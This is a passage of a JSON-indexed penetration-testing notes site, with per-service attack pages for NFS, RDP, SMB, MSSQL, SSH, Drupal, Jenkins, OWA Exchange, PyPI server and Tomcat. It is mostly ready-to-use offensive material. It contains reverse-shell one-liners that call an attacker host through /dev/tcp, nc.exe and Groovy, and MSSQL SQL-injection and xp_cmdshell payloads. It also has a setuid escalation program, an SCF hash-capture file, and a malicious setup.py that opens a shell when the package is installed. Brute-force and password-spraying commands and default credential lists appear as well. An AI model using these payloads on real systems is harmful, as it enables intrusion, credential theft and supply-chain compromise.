						"content": "Network File System is a distributed file system protocol originally developed by Sun Microsystems in 1984, allowing a user on a client computer to access files over a computer network much like local storage is accessed. Enumeration showmount gives us the opportunity to know which folder are available for us. showmount -e &lt;IP&gt; Mounting the folder We can mount the folder with mount command. mount -t nfs [-o vers=2] &lt;IP&gt;:&lt;NFS_FOLDER&gt; &lt;LOCAL_FOLDER&gt; -o nolock Configuration The file etc exports show the NFS configuration applied on the server. $ cat etc exports var nfsshare *(rw,sync,root_squash,no_all_squash) opt *(rw,sync,root_squash,no_all_squash rw: Means that we can read and write any file on the share. root_squash (default): Maps all the requests from UID GID 0 to the anonymous UID GID. no_root_squash: All requests from UID GID 0 are not mapped to the anonymous UID GID. no_all_squash (default): Not map all the requests from other UID GID to the anonymous UID GID . Note: If we have access to the server and a NFS share has this configuration, we can impersonate any user on the attack machine except for the root user. Impersonate a User (No Root) So what we’ll do is add the user frank (user to impersonate) on our kali machine and change his id to 1000 (Assigned on the target). ❯ useradd frank ❯ cat etc passwd | grep frank frank:x:1000:1000:: home frank: bin sh Note: You can change any ID by modifying the etc passwd file. Next step is create a setuid.c file: #include &lt;unistd.h&gt; int main() { setreuid(1000,1000); execl(\" bin bash\", \"bash\", (char *)NULL); return 0; } Then compile it: gcc setuid.c -o setuid Set the sticky bit on the file: chmod u+s setuid And execute it on the target machine. References https: book.hacktricks.xyz pentesting nfs-service-pentesting https: ethicalhackingguru.com how-to-enumerate-and-exploit-nfs-shares"
					}

					
				
			
		
			
				
					,
					

					"services-rdp": {
						"id": "services-rdp",
						"title": "PORT 3389/tcp - RDP",
						"category": "",
						"url": " /services/rdp/",
						"content": "Introduction Remote Desktop Protocol is a proprietary protocol developed by Microsoft which provides a user with a graphical interface to connect to another computer over a network connection. The user employs RDP client software for this purpose, while the other computer must run RDP server software Enumeration With nmap we can enumerate the service a little bit, and obtain information such as the DOMAIN or the HOSTNAME. Also checks available encryption and DoS vulnerabilities. nmap -sV --script \"rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info\" -p 3389 &lt;ip-addr&gt; Checking Credentials With rdp_check we can check credentials. rdp_check &lt;domain&gt; &lt;username&gt;:&lt;password&gt;@&lt;ip-addr&gt; Connect via RDP rdesktop rdesktop &lt;ip-addr&gt; rdesktop -u &lt;user&gt; -p &lt;password&gt;&lt;ip-addr&gt; rdesktop -d &lt;domain&gt; -u &lt;user&gt; -p &lt;password&gt; &lt;ip-addr&gt; xfreerdp xfreerdp is an X11 Remote Desktop Protocol (RDP) client which is part of the FreeRDP project. An RDP server is built-in to many editions of Windows. Alternative servers included xrdp and VRDP (VirtualBox). xfreerdp d:&lt;domain&gt; u:&lt;user&gt; p:&lt;password&gt; v:10.10.10.10 xfreerdp u:&lt;user&gt; p:&lt;password&gt; v:10.10.10.10 Connect RDP via pass the hash. xfreerdp u:&lt;user&gt; pth:e3071bcf8c3ad25c891a8898f56aa62b v:10.10.10.10 Other configurations. workarea Full Window +clipboard Enable shared clipboard drive:share, mnt folder Create a Shared folder Post Exploitation With mimikatz is possible to obtain the current sessions and connect it. Check section **Hijacking RDP Session ** to more info. Get Credentials Enable RDP When we fully compromised the server we can enable RDP. reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" v fDenyTSConnections t REG_DWORD d 0 f And add the user or group to the Remote Desktop Users group. net localgroup “remote desktop users” user add"
					}

					
				
			
		
			
				
					,
					

					"services-rpcbind": {
						"id": "services-rpcbind",
						"title": "PORT 111/tcp - RPCBind",
						"category": "",
						"url": " /services/rpcbind/",
						"content": "Provides information between Unix based systems. Port is often probed, it can be used to fingerprint the Nix OS, and to obtain information about available services. Port used with NFS, NIS or others.. Enumeration We can enumerate RPCBind service with rpcinfo or nmap: rpcinfo ip-addr nmap -sSUC -p 111 ip-addr Example output of rpcinfo: program version netid address service owner 100000 4 tcp6 ::.0.111 portmapper superuser 100000 3 tcp6 ::.0.111 portmapper superuser 100000 4 udp6 ::.0.111 portmapper superuser 100000 3 udp6 ::.0.111 portmapper superuser 100000 4 tcp 0.0.0.0.0.111 portmapper superuser 100000 3 tcp 0.0.0.0.0.111 portmapper superuser 100000 2 udp 0.0.0.0.0.111 portmapper superuser 100000 4 local run rpcbind.sock portmapper superuser 100000 3 local run rpcbind.sock portmapper superuser 100005 1 udp 0.0.0.0.128.213 mountd superuser 100005 1 tcp 0.0.0.0.208.235 mountd superuser 100005 1 udp6 ::.163.28 mountd superuser 100005 1 tcp6 ::.183.211 mountd superuser 100005 2 udp 0.0.0.0.190.193 mountd superuser 100005 2 tcp 0.0.0.0.188.127 mountd superuser 100005 2 udp6 ::.233.215 mountd superuser 100005 2 tcp6 ::.165.45 mountd superuser 100005 3 udp 0.0.0.0.130.78 mountd superuser 100005 3 tcp 0.0.0.0.148.209 mountd superuser 100005 3 udp6 ::.150.143 mountd superuser 100005 3 tcp6 ::.217.45 mountd superuser 100003 2 tcp 0.0.0.0.8.1 nfs superuser 100003 3 tcp 0.0.0.0.8.1 nfs superuser 100003 4 tcp 0.0.0.0.8.1 nfs superuser 100227 2 tcp 0.0.0.0.8.1 - superuser 100227 3 tcp 0.0.0.0.8.1 - superuser 100003 2 udp 0.0.0.0.8.1 nfs superuser 100003 3 udp 0.0.0.0.8.1 nfs superuser 100003 4 udp 0.0.0.0.8.1 nfs superuser 100227 2 udp 0.0.0.0.8.1 - superuser 100227 3 udp 0.0.0.0.8.1 - superuser 100003 2 tcp6 ::.8.1 nfs superuser 100003 3 tcp6 ::.8.1 nfs superuser 100003 4 tcp6 ::.8.1 nfs superuser 100227 2 tcp6 ::.8.1 - superuser 100227 3 tcp6 ::.8.1 - superuser 100003 2 udp6 ::.8.1 nfs superuser 100003 3 udp6 ::.8.1 nfs superuser 100003 4 udp6 ::.8.1 nfs superuser 100227 2 udp6 ::.8.1 - superuser 100227 3 udp6 ::.8.1 - superuser 100021 1 udp 0.0.0.0.167.136 nlockmgr superuser 100021 4 tcp 0.0.0.0.174.121 nlockmgr superuser 100021 1 udp6 ::.164.129 nlockmgr superuser 100021 1 tcp6 ::.130.83 nlockmgr superuser NFS If you find the service NFS then probably you will be able to list and download(and maybe upload) files: nmap -p 2049 -sV --script nfs-\\* ip-addr showmount -e ip-addr After finding the nfs folder we can mount these shares in our filesystem: sudo mount -o nolock -t nfs [-o vers=2] &lt;ip-addr&gt;:&lt;remote_folder&gt; &lt;local_folder&gt; NFS Service References: https: docs.oracle.com cd E56339_01 html E53865 gntib.html https: book.hacktricks.xyz pentesting nfs-service-pentesting https: book.hacktricks.xyz pentesting pentesting-rpcbind"
					}

					
				
			
		
			
				
					,
					

					"services-smb": {
						"id": "services-smb",
						"title": "PORT 139/tcp, 445/tcp - SMB",
						"category": "",
						"url": " /services/smb/",
						"content": "SMB stands for Server Message Block. It’s a protocol for sharing resources like files, printers, in general any resource which should be retreivable or made available by the server. Introduction It primarily runs on port 445 or port 139 depending on the server . It is actually natively available in windows, so windows users don’t need to configure anything extra as such besides basic setting up. In Linux however ,it is a little different. To make it work for Linux, you need to install a samba server because Linux natively does not use SMB protocol. Scanning the network Nmap We can do a port scanner selecting the NetBIOS and SMB ports: nmap -v -p 139,445 -oG smb.nmap &lt;ip-addr&gt; &lt;mask&gt; grep \"Up\" smb.nmap | cut -d \" \" -f 2 Nbtscan We can scan for NetBIOS Service around the network in order to collect additional NetBIOS information like server names: sudo nbtscan -r &lt;ip-addr&gt; &lt;mask&gt; Enumeration a target Nmap scripts Nmap contains many useful NSE scripts that can be used to discover and enumerate SMB services. All these scripts are in the folder usr share nmap scripts ls -l usr share nmap scripts smb* You can launch the script with the --script parameter: nmap -v -p 139,445 --script=&lt;script&gt; &lt;ip-addr&gt; Enum4linux Enum4linux is an script that automatize some tasks: enum4linux -a [-u &lt;user&gt; -p &lt;pass&gt;\"] &lt;ip-addr&gt; Shared Folders There are some available nmap scripts that could help us in that work: nmap -p 139,445 -sV --script smb-\\* &lt;ip-addr&gt; smbmap will shows us available shares and permissions: smbmap -H &lt;ip-addr&gt; #Example Output [+] Guest session IP: ip-addr:445 Name: ip-addr Disk Permissions Comment ---- ----------- ------- print$ NO ACCESS Printer Drivers anonymous READ ONLY IPC$ NO ACCESS IPC Service (kenobi server (Samba, Ubuntu)) And we can connect to these shares with smbclient: smbclient &lt;ip-addr&gt; &lt;share&gt; # Guest Session smbclient &lt;ip-addr&gt; &lt;share&gt; -U \"\" -N # Null Session smbclient &lt;ip-addr&gt; &lt;share&gt; -U &lt;user&gt; # Authenticated Session # Older versions smbclient &lt;ip-addr&gt; &lt;share&gt; --option='client min protocol=NT1' To download recursively all the share you can use smbget: smbget -R smb: &lt;ip-addr&gt; &lt;share&gt; smbget -R smb: &lt;ip-addr&gt; &lt;share&gt; -U &lt;user&gt; Also you could enumerate shares with crackmapexec: crackmapexec smb &lt;ip-addr&gt; -u '' -p '' --shares #Null user crackmapexec smb &lt;ip-addr&gt; -u 'username' -p 'password' --shares #Guest user crackmapexec smb &lt;ip-addr&gt; -u 'username' -H '&lt;HASH&gt;' --shares #Guest user Finally you can mount the share on your kali. sudo mount -t cifs -o vers=2.0,username=guest,password=guest &lt;ip-addr&gt; &lt;share&gt; Shell Command Files (SCF) attack It is not new that SCF (Shell Command Files) files can be used to perform a limited set of operations such as showing the Windows desktop or opening a Windows explorer. However a SCF file can be used to access a specific UNC path which allows the penetration tester to build an attack. The code below can be placed inside a text file which then needs to be planted into a network share. [Shell] Command=2 IconFile=\\\\&lt;OUR.IP&gt;\\share\\pentestlab.ico [Taskbar] Command=ToggleDesktop Adding the @ symbol in front of the filename will place the file on the top of the share drive. Filename: @attack.scf When the user will browse the share a connection will established automatically from his system to the UNC path that is contained inside the SCF file. Windows will try to authenticate to that share with the username and the password of the user, so we can capture it with Responder. responder -I eth0 https: pentestlab.blog 2017 12 13 smb-share-scf-file-attacks References: https: medium.com @arnavtripathy98 smb-enumeration-for-penetration-testing-e782a328bf1b https: book.hacktricks.xyz pentesting pentesting-smb#port-139 http: carnal0wnage.attackresearch.com 2007 07 enumerating-user-accounts-on-linux-and.html"
					}

					
				
			
		
			
				
					,
					

					"services-smtp": {
						"id": "services-smtp",
						"title": "PORT 25/tcp - SMTP",
						"category": "",
						"url": " /services/smtp/",
						"content": "The Simple Mail Transfer Protocol (SMTP) is a communication protocol for electronic mail transmission. As an Internet standard. Enumeration User Enumeration SMTP supports several interesting commands, such as VRFY and EXPN. VRFY: Ask the server to verify and email address. EXPN: Ask the server for membership of a mailing list. smtp-user-enum.pl -M VRFY -U users.txt -t 10.0.0.1 smtp-user-enum.pl -M EXPN -u admin1 -t 10.0.0.1 smtp-user-enum.pl -M RCPT -U users.txt -T mail-server-ips.txt smtp-user-enum.pl -M EXPN -D example.com -U users.txt -t 10.0.0.1 Send Mails Telnet Netcat We can conect to our SMTP server via telnet. telnet smtp.server.local 25 nc -nv smtp.server.local 25 Once we’ve got established our connection, we will send a HELO with the name of the host we are trying to connect followed by the message HELO smtp.server MAIL FROM: test@server.local RCPT TO: victim@server.local DATA Subject: Check this out! Body of the message ended with a dot . Swiss Army Knife SMTP (swaks) Other solution to automatize some tasks is using swaks: swaks --to 'victim@server.local' --from 'test@server.local' --server 'smtp.server.local' --header 'Subject: Check this out!' --body 'Body of the message' References: https: book.hacktricks.xyz pentesting pentesting-smtp http: systemadmin.es 2009 01 como-mandar-un-email-con-telnet-protocolo-smtp https: metacpan.org pod distribution Mail-Toaster contrib swaks"
					}

					
				
			
		
			
				
					,
					

					"services-snmp": {
						"id": "services-snmp",
						"title": "PORT 161/udp - SNMP",
						"category": "",
						"url": " /services/snmp/",
						"content": "The Simple Network Management Protocol (SNMP) talks to your network to find out information related to this network device activity: for example, bytes, packets, and errors transmitted and received. Introduction SNMP is not well-understood by many network administrators. This often results in SNMP misconfigurations, which can result in significant information leakage. Scanning the network To scan for open SNMP ports we can use nmap: sudo nmap -sU --open -P 161 &lt;ip-addr&gt; &lt;mask&gt; -oG open-snmp.nmap Bruteforce attack We can use tools such as onesixtyone, which will attempt to brute force attack against a list of IP addresses. First we need to create a file containing community strings: echo public &gt; community.txt echo private &gt;&gt; community.txt echo manager &gt;&gt; community.txt for ip in $(seq 1 254); do echo 10.0.0.$ip; done &gt; ips.txt And run the tool: onesixtyone -c community.txt -i ips.txt Enumeration Entire MIB Tree snmpwalk -c public -v1 -t 10 &lt;ip-addr&gt; Windows Users snmpwalk -c public -v1 -t &lt;ip-addr&gt; 1.3.6.1.4.1.77.1.2.25 Running Windows Processes snmpwalk -c public -v1 &lt;ip-addr&gt; 1.3.6.1.2.1.25.4.2.1.2 Open TCP Ports snmpwalk -c public -v1 &lt;ip-addr&gt; 1.3.6.1.2.1.6.13.1.3 Installed Software snmpwalk -c public -v1 &lt;ip-addr&gt; 1.3.6.1.2.1.25.6.3.1.2"
					}

					
				
			
		
			
				
					,
					

					"services-sql-server": {
						"id": "services-sql-server",
						"title": "PORT 1433/tcp - Microsoft SQL Server",
						"category": "",
						"url": " /services/sql-server/",
						"content": "Introduction Microsoft SQL Server is a relational database management system developed by Microsoft. As a database server, it is a software product with the primary function of storing and retrieving data as requested by other software applications—which may run either on the same computer or on another computer across a network. Syntax select CURRENT_USER select name from master..sysdatabases select name from music..sysobjects WHERE xtype = 'U' select name from syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'users') select user, password from users RCE With Credentials sqsh sqsh -S &lt;IP-ADDR&gt; -U &lt;user&gt; -P &lt;pass&gt; -D &lt;database&gt; In MSSQL there is a procedure called xp_cmdshell that receives a command from Windows, executes it and return the result as rows of text. Although the most common case is that the user of the application does not have permissions to execute the xp_cmdshell procedure because is disabled by default, it has been seen on several occasions that, due to a misconfiguration, it does have permissions to enable it. We need to configure xp_cmdshell. 1&gt; EXEC SP_CONFIGURE N'show advanced options', 1 2&gt; go Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install. (return status = 0) 1&gt; EXEC SP_CONFIGURE N'xp_cmdshell', 1 2&gt; go Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install. (return status = 0) 1&gt; RECONFIGURE 2&gt; go Once configured we can execute commands with sqsh or crackmapexec. 1&gt; xp_cmdshell 'dir c:\\'; 2&gt; go crackmapexec We can execute code in a easier way with crackmapexec. crackmapexec mssql -u sa -p password --local-auth -x 'whoami' SQL Injection in MSSQL To understand the vulnerability visit the following page link. SQL Injection Some SQLi payloads are the following (supposing that the original query return two values): ' union all select 1,2 -- - # Current User ' union all select CURRENT_USER, 2 -- - # Databases ' union all select name, 2 from master..sysdatabases -- - # Tables from database \"music\" ' union all select name, 2 from music..sysobjects WHERE xtype = 'U' -- - # Columns from \"users\" table ' union all select name, 2 from syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'users') -- - # Dump a table ' union all select user, password from users -- - We can also append commands on the query and execute commands with the procedure xp_cmdshell. '; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; -- - '; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; -- - '; EXEC xp_cmdshell '\\\\10.10.10.10\\share\\nc.exe -e cmd.exe 10.10.10.10 443' -- - LFI or File Download to RCE If we are able to download any file of the system and has the MSSQL port open, we can retrieved the sa hash. We need to download a copy of the master.mdf file located on: C: Program Files Microsoft SQL Server MSSQL14.SQLEXPRESS MSSQL DATA master.mdf or C: Program Files Microsoft SQL Server MSSQL14.SQLSERVER MSSQL DATA master.mdf Since the file is running we can not read it, so we need to find a backup. Some backups are available here: C: Program Files Microsoft SQL Server MSSQL14.SQLEXPRESS MSSQL Backup master.mdf Once downloaded we can dump the hashes with XPN script. https: github.com xpn Powershell-PostExploitation tree master Invoke-MDFHashes Note: The code fails while trying to load OrcaMDF dlls, see the following pull request to fix it. https: github.com xpn Powershell-PostExploitation pull 2 File changed: We just need to import the module and extract the hashes. Import-Module Get-MDFHashes.psq Get-MDFHashes -mdf master.mdf We can crack it with Hashcat (mode 1731). hashcat -a 0 -m 1731 hash.txt usr share wordlists rockyou.txt Once obtained the credentials we can execute code with crackmapexec or sqsh. https: blog.xpnsec.com extracting-master-mdf-hashes References https: www.tarlogic.com blog red-team-tales-0x01 #:~:text=In%20MSSQL%2C%20there%20is%20a,occurs%20in%20the%20original%20query. https: dotcppfile.wordpress.com 2014 07 24 reading-files-in-mssql-injection-tutorial https: github.com swisskyrepo PayloadsAllTheThings blob master SQL%20Injection MSSQL%20Injection.md https: blog.xpnsec.com extracting-master-mdf-hashes"
					}

					
				
			
		
			
				
					,
					

					"services-ssh": {
						"id": "services-ssh",
						"title": "PORT 22/tcp - SSH",
						"category": "",
						"url": " /services/ssh/",
						"content": "Introduction The SSH protocol works on the client server-model. The SSH client always initiates the setup of the secure connection, and the SSH server listens for incoming connection requests (usually on TCP port 22 on the host system) and responds to them. In the connection setup phase, the SSH server authenticates itself to the client by providing its public key. This allows the SSH client to verify that it is actually communicating with the correct SSH server (instead of an attacker that could be posing as the server). After a successful authentication the server provides the client access to the host system. This access is governed with the user account permissions at the target host system. Bruteforcing Credentials To bruteforce the login in order to find valid credentials we can use different tools: Ncrack ncrack -U usernames.txt -P passowrds.txt ssh: 10.10.10.10 -v ncrack -u root -P passowrds.txt ssh: 10.10.10.10 -v Medusa medusa -h 10.10.10.10 -U usernames.txt -P passowrds.txt -M ssh medusa -h 10.10.10.10 -u root -P passowrds.txt -M ssh Hydra hydra -L usernames.txt -P passwords.txt ssh: 10.10.10.10 -s 22 hydra -l root -P passwords.txt ssh: 10.10.10.10 -s 22 Patator patator ssh_login host=10.10.10.10 user=FILE0 password=FILE1 0=users.txt 1=pass.txt -x ignore:mesg='Authentication failed' patator ssh_login host=10.10.10.10 user=root password=FILE0 0=pass.txt -x ignore:mesg='Authentication failed' Donwload Files To download files we can use sftp or scp: SFTP Is like ftp: sftp root@ip &gt; get file.txt &gt; get -r folder SCP scp root@ip: tmp file.txt file.txt scp -r root@ip: tmp folder folder"
					}

					
				
			
		
			
				
					,
					

					"software-drupal": {
						"id": "software-drupal",
						"title": "Drupal",
						"category": "",
						"url": " /software/drupal/",
						"content": "Enumeration We can obtain the server version on the next resource: https: target.com core install.php Drupalgeddon (&lt;7.58, &lt;8.5.1, &lt;8.46, &lt;8.3.9) - CVE-2018-7600 All version of drupal lower than 7.58 are vulnerable to RCE. ruby drupalgeddon2.rb http: &lt;ip&gt; https: github.com dreadlocked Drupalgeddon2 From Admin to Reverse Shell Firstly we need to enable PHP filter on Modules tab. And go to Content -&gt; +Add Content -&gt; Article, select PHP code as Text Format and finally introduce the reverse shell on the body. &lt;?php exec(\" bin bash -c 'bash -i &gt;&amp; dev tcp 10.10.14.20 4444&gt;&amp;1'\"); ?&gt; Finally clicking Preview button a reverse shell is spawned to our listener. Config files Database Connection $DRUPAL sites default settings.php"
					}

					
				
			
		
			
				
					,
					

					"software-jenkins": {
						"id": "software-jenkins",
						"title": "Jenkins",
						"category": "",
						"url": " /software/jenkins/",
						"content": "Introduction Jenkins is a free and open source automation server. It helps automate the parts of software development related to building, testing, and deploying, facilitating continuous integration and continuous delivery. It is a server-based system that runs in servlet containers such as Apache Tomcat. Enumeration We can obtain a some valuable information without necessarily log in on the server. Jenkins Version Visit the following route to obtain the Jenkins version on the footer page. oops error Page generated: Sep 27, 2021 12:46:28 PM PDTREST APIJenkins ver. 2.204.1 Users Without credentials it is possible to obtain some users. people people asynchPeople asynchPeople securityRealm user admin search index?q= Credentials There are no default credentials but some times these works. Note: Jenkins does not have any type of account lockout neither a strong password policy so you can try to brute force it. admin:admin admin:nimda admin:password admin:jenkins manager:manager manager:reganam manager:password manager:jenkins builduser:builduser In new versions the password is randomized at installation. We can find the initial password here: Linux var jenkins_home secrets initialAdminPassword home jenkins secrets initialAdminPassword var lib jenkins secrets initialAdminPassword opt jenkins secrets initialAdminPassword Windows C:\\Program Files (x86)\\Jenkins\\secrets\\initialAdminPassword C:\\Program Files\\Jenkins\\secrets\\initialAdminPassword From Admin to Reverse Shell There are multiple ways in which from administrative privileges in Jenkins you can get a reverse shell. Script Console To obtain a Reverse shell we need to execute Manage Jenkins on Script Console. http: &lt;jenkins_server&gt; script This is and example of Grovy Script to execute commands on the target machine, either windows or linux. def sout = new StringBuffer(), serr = new StringBuffer() def proc = 'whoami'.execute() proc.consumeProcessOutput(sout, serr) proc.waitForOrKill(1000) println \"out&gt; $sout err&gt; $serr\" Windows Reverse Shell String host=\"&lt;IP-ADDR&gt;\"; int port=&lt;PORT&gt;; String cmd=\"cmd.exe\"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close(); Linux Reverse Shell First we need to craft the payload. $ echo \"bash -c 'bash -i &gt;&amp; dev tcp 10.10.10.10 443 0&gt;&amp;1'\" | base64 YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC80NDMgMD4mMScK And introduce inside the Grovvy script. def sout = new StringBuffer(), serr = new StringBuffer() def proc = 'bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC80NDMgMD4mMScK}|{base64,-d}|{bash,-i}'.execute() proc.consumeProcessOutput(sout, serr) proc.waitForOrKill(1000) println \"out&gt; $sout err&gt; $serr\" Freestyle Project We can create a new project or see if we can modify the configuration of an existant project. To create a new project go on New Item tab. Introduce a name such as Access and select Freestyle Project . Scroll down until you find the Build section and add a Execute Windows batch command as build step. Introduce the reverse shell on the Command window and click Save. \\\\10.10.10.10\\share\\nc.exe -e cmd.exe 10.10.10.10 powershell.exe -c &lt;command&gt; Go to Build Now section. When the build is executed a new item will be displayed under the Build History. At that moment a reverse shell is obtained. $ sudo nc -lvp 443 listening on [any] 443 ... connect to [10.10.10.11] from (UNKNOWN) [10.10.10.11] 26524 Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\Windows\\system32&gt; We can also check the console output selecting the Built Item #1 and going to Console Output section."
					}

					
				
			
		
			
				
					,
					

					"software-owa-exchange": {
						"id": "software-owa-exchange",
						"title": "OWA Exchange",
						"category": "",
						"url": " /software/owa-exchange/",
						"content": "The user interface in Outlook on the web (formerly known as Outlook Web App) for Exchange Server has been optimized and simplified for use with phones and tablets. Supported web browsers give users access to more Outlook features. When you install Exchange Server, Outlook on the web is automatically available for internal users at https: &lt;ServerName&gt; owa (for example, https: mailbox01.contoso.com owa). But, you’ll likely want to configure Outlook on the web for external access (for example, https: mail.contoso.com owa). In this section some attacks and enumeration techniques are going to be detailed. Password Spraying Two excellent tools for password spraying againts Office 365 and Exchange are MailSniper and SprayingToolkit. https: github.com dafthack MailSniper https: github.com byt3bl33d3r SprayingToolkit Import-Module .\\MailSniper.ps1 NetBIOS Enumeration Enumerate the NetBIOS name of the target domain. Invoke-DomainHarvestOWA -ExchHostname &lt;IP&gt; Domain Hardvesting We can also bruteforce with a wordlist the OWA in order to find new domains. Invoke-DomainHarvestOWA -ExchHostname 10.10.10.10 -DomainList .\\domains.txt -Brute [*] Harvesting domain name from the server at 10.10.10.10 Determining baseline response time... Response Time (MS) Domain\\Username 35 DcXGdH\\RMiZSy 37 XmSgFT\\CLJKpM 56 NxgOsI\\zcYaPt 28 MgSBFo\\YXEQcP 40 BAYNGp\\xFqOer Baseline Response: 39.2 Threshold: 107.8 Response Time (MS) Domain\\Username 28 www\\LjldcpFEeQ 28 mail\\LjldcpFEeQ 36 ftp\\LjldcpFEeQ 37 localhost\\LjldcpFEeQ 49 webmail\\LjldcpFEeQ 57 smtp\\LjldcpFEeQ 60 webdisk\\LjldcpFEeQ 40 pop\\LjldcpFEeQ 30 cpanel\\LjldcpFEeQ 32 whm\\LjldcpFEeQ 36 ns1\\LjldcpFEeQ 26 ns2\\LjldcpFEeQ 27 autodiscover\\LjldcpFEeQ 32 autoconfig\\LjldcpFEeQ 27 ns\\LjldcpFEeQ 26 test\\LjldcpFEeQ 43 m\\LjldcpFEeQ 26 blog\\LjldcpFEeQ 739 dev\\LjldcpFEeQ [*] Potentialy Valid Domain! Domain:dev 61 www2\\LjldcpFEeQ 44 ns3\\LjldcpFEeQ Finding Posible Usernames It is common to see in organizations that usernames follow a pattern. For example:, typicall patterns are: {first}.{last} {f}.{last} {f}{last} {f}{las} {last}{first} Hunter.io Hunter.io lets you find professional email addresses with a domain in seconds and find the pattern using different hardvesting techniques. https: hunter.io Namemash.py namemash.py is a python script that transforms a list of person’s full name into possible username permutations. https: gist.github.com superkojiman 11076951 root@kali:~# cat names.txt John Doe root@kali:~# namemash.py names.txt johndoe doejohn john.doe doe.john doej jdoe djoe j.doe d.john john joe Validating Posible Usernames Invoke-UsernameHarvestOWA uses a timing attack to validate which (if any) of these usernames are valid. MailSniper: Invoke-UsernameHarvestOWA -ExchHostname &lt;IP&gt; -Domain CORP -UserList .\\possible-usernames.txt -OutFile valid.txt Spraying Passwords MailSniper can spray passwords against Outlook Web Access (OWA), Exchange Web Services (EWS) and Exchange ActiveSync (EAS). MailSniper: Invoke-PasswordSprayOWA -ExchHostname &lt;IP&gt; -UserList &lt;userlist.txt&gt; -Password \"Corp2022\" OPSEC Alert: Be careful when making authentication attempts as we may block accounts. Furthermore, making too many attempts in a short time is very noisy. Retrieving Address List With credentials of a user inbox we can retrieve the whole address list. MailSniper: Get-GlobalAddressList -ExchHostname &lt;IP&gt; -UserName &lt;CORP jdoe&gt; -Password &lt;Corp2022&gt; -Outfile addres-list.txt"
					}

					
				
			
		
			
				
					,
					

					"software-pypi-server": {
						"id": "software-pypi-server",
						"title": "PyPI Server",
						"category": "",
						"url": " /software/pypi-server/",
						"content": "PyPI Server (pypiserver) is a minimal PyPi compatible server for pip or easy_install. What is a PyPI Server? pypiserver is a minimal PyPI compatible server for pip or easy_install. It is based on bottle and serves packages from regular directories. Wheels, bdists, eggs and accompanying PGP-signatures can be uploaded either with pip, setuptools, twine, pypi-uploader, or simply copied with scp. PyPI Server helps us to create a Pirvate Python Package Repository. What happens when someone installs from that server and we have the password? On that moment that we notice that someone installs all packages from the pypiserver, and we have the password, we can upload our malicious python package. We will usually find the password inside the .htpasswd file from apache or nginx. Create our Python Package Firstly, we need to create a directory with the name of the package, in this example I will use demo_hacking. Navigate into the newly created directory. And create the following files following the hierarchy: demo_hacking ├── demo_hacking │ └── __init__.py ├── README.md ├── setup.cfg ├── setup.py └── .pypirc Edit setup.py file, in this file we will put our malicious code. At the moment of the installation package our code will execute on victim’s machine. This is an example of reverse shell from setuptools import setup import os os.system(\"nc -e bin bash ip-addr port\") #this is the malicious code setup( name='demo_hacking', packages=['demo_hacking'], description='Demo H4ck1ng edition', version='0.1', author='mvc1009', keywords=['pip','demo','hacking'] ) Add an example function to __init__.py: def print_demo(): print(\"Demo Hacking\") The setup.cfg file lets PyPI know the README is a Markdown file: [metadata] description-file = README.md Create an empty README.md optionally you can create a LICENSE.txt file: touch REAMDE.md touch LICENSE.txt Finally you need to create the .pypirc file on the home directory: [distutils] index-servers = pypi demo [pypi] username: password: [demo] repository: http: localhost:port username: user password: password Hint: Do not forget that you can change the dome directory path: export HOME=path Finally you need to upload de package to the pypiserver. python setup.py sdist upload -r demo References: https: pypi.org project pypiserver https: www.linode.com docs guides how-to-create-a-private-python-package-repository"
					}

					
				
			
		
			
				
					,
					

					"software-tomcat": {
						"id": "software-tomcat",
						"title": "Tomcat",
						"category": "",
						"url": " /software/tomcat/",
						"content": "Tomcat is a web service commonly open in port 8080 tcp. Introduction Apache Tomcat is a free and open-source implementation of the Java Servlet, JavaServer Pages, Java Expression Language and WebSocket technologies. Tomcat provides a “pure Java” HTTP web server environment in which Java code can run. Apache Tomcat &lt; 9.0.1 (Beta) &lt; 8.5.23 &lt; 8.0.47 &lt; 7.0.8 - JSP Upload Bypass Exists a exploit to execute remote command by uploading a .war file without prior authentication. https: www.exploit-db.com exploits 42966 Installation Directory Depending the version installed or if its installed manually or using apt, it would be located in different places. opt tomcat opt tomcat7 opt tomcat9 usr share tomcat usr share tomcat7 usr share tomcat9 Configuration Files There are serveral important files to look into and take info about the server. server.xml The server.xml file is Tomcat’s main configuration file, and is responsible for specifying Tomcat’s initial configuration on startup as well as defining the way and order in which Tomcat boots and builds. The elements of the server.xml file belong to five basic categories - Top Level Elements, Connectors, Containers, Nested Components, and Global Settings. TOMCAT-HOME conf web.xml web.xml The web.xml file is derived from the Servlet specification, and contains information used to deploy and configure the components of your web applications. TOMCAT-HOME conf web.xml tomcat-users.xml This last file contains the credentials and privileges of the tomcat users. TOMCAT-HOME etc tomcat-users.xml Default credentials SecLists have a list of default credentials in Tomcat: admin: admin:admanager admin:admin admin:admin ADMIN:ADMIN admin:adrole1 admin:adroot admin:ads3cret admin:adtomcat admin:advagrant admin:password admin:password1 admin:Password1 admin:tomcat admin:vagrant both:admanager both:admin both:adrole1 both:adroot both:ads3cret both:adtomcat both:advagrant both:tomcat cxsdk:kdsxc j2deployer:j2deployer manager:admanager manager:admin manager:adrole1 manager:adroot manager:ads3cret manager:adtomcat manager:advagrant manager:manager ovwebusr:OvW*busr1 QCC:QLogic66 role1:admanager role1:admin role1:adrole1 role1:adroot role1:ads3cret role1:adtomcat role1:advagrant role1:role1 role1:tomcat role:changethis root:admanager root:admin root:adrole1 root:adroot root:ads3cret root:adtomcat root:advagrant 